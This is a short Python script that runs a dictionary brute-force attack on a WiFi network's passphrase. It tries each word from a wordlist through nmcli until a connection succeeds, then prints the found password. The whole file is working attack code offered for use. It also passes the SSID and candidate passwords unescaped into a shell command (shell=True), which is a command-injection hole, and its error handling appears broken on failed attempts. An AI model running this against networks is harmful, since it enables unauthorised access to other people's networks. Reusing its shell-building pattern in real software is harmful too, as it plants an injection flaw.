#!/usr/bin/env python3

from sys import argv, stderr
from subprocess import check_output
import wifi

IFACE=None

def usage():
    print('usage: %s iface ssid dictionary' %argv[0])
    return 0

def brute(ssid, dictionary):
    with open(dictionary) as f:
        candidate = f.readline().replace('\n', '').strip()
        while candidate:
            test_pass(candidate, ssid)
            candidate = f.readline().replace('\n', '').strip()
            print(candidate)

def test_pass(passphrase, ssid):
    print('Testing %s against %s...' %(passphrase, ssid))
    output = check_output("/usr/bin/nmcli dev wifi connect %s password %s ifname %s" %(ssid, passphrase, IFACE), shell=True).decode('utf-8')
    #print(output)
    if 'secrets' not in output and 'Err' not in output:
        print('The pass is %s' %passphrase)
        exit()

def main():
    global IFACE
    if len(argv) != 4:
        return usage()
    executable, IFACE, ssid, dictionary = argv
    cells = wifi.Cell.all(IFACE)
    cell_to_brute = None
    for cell in cells:
        if cell.ssid == ssid:
            cell_to_brute = cell
    if not cell_to_brute:
        print("Error : SSID %s not found" %ssid, file=stderr)
        return 1
    brute(ssid, dictionary)
    return 0

if __name__ == "__main__":
    exit(main())
